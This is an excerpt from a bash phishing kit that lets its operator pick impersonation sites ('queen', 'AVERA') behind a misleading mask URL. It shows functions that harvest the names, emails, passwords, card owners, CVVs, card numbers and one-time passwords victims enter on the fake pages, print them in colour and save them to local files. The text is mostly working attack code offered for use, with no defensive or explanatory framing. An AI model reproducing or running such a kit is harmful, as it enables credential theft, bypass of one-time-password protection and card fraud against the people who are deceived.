...
banner() {
	cat <<- EOF
		...
		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Sa升升am
	EOF
}
...
## Get credentials
capture_creds() {
	NAME=$(grep -o 'Name:.*' .server/www/info.txt | awk '{print $2}')
	EMAIL=$(grep -o 'Email:.*' .server/www/info.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Password:.*' .server/www/info.txt | awk '{print $2}')
	OWNER=$(grep -o 'Owner:.*' .server/www/info.txt | awk '{print $2}')
	CVV=$(grep -o 'cvv:.*' .server/www/info.txt | awk '{print $2}')
	cardNumber=$(grep -o 'cardNumber:.*' .server/www/info.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Name : ${BLUE}$NAME"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Email : ${BLUE}$EMAIL"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Owner : ${BLUE}$OWNER"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} cvv : ${BLUE}$CVV"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} cardNumber : ${BLUE}$cardNumber"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/info.txt"
	cat .server/www/info.txt >> auth/info.txt
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting OTP info,"
}

## Get OTP
capture_otp() {
	OTP=$(grep -o 'OTP:.*' .server/www/otp.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} OTP : ${BLUE}$OTP"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/otp.txt"
	cat .server/www/otp.txt >> auth/otp.txt
...
main_menu() {
	...
	case $REPLY in 
		1 | 01)
			website="queen"
			mask='https://queen-all-prand-in-a-same-site'
			tunnel_menu;;
		2 | 02)
			website="AVERA"
